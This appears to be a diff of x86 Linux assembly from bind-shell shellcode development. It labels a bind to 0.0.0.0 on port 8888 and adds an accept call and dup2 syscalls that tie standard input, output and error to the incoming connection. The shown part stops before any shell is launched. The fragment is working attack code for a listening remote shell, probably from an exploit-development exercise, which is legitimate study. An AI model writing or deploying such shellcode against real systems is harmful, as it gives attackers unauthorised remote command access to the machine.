@@ -50,8 +50,8 @@ _start:
 	; Bind - 361
 	mov eax, 0x169
 	mov ebx, [socket]
-	push    dword   0x00000000 
-    push    dword   0xb822; big endian
+	push    dword   0x00000000 ; ip 0.0.0.0
+    push    dword   0xb822; port 8888, big endian
     push    word    2 
     mov [socket_address], esp
 	mov ecx, [socket_address]
@@ -96,6 +96,24 @@ _start:
 	mov ebx, [socket]
 	mov ecx, 0
 	mov edx, 0x10 ; 16 
+	int 0x80
+
+	mov [accept_res], eax
+
+	;dup2
+	mov eax, 0x3f
+	mov ebx, [accept_res]
+	mov ecx, 0
+	int 0x80
+
+	mov eax, 0x3f
+	mov ebx, [accept_res]
+	mov ecx, 1
+	int 0x80
+
+	mov eax, 0x3f
+	mov ebx, [accept_res]
+	mov ecx, 2
 	int 0x80
 
 
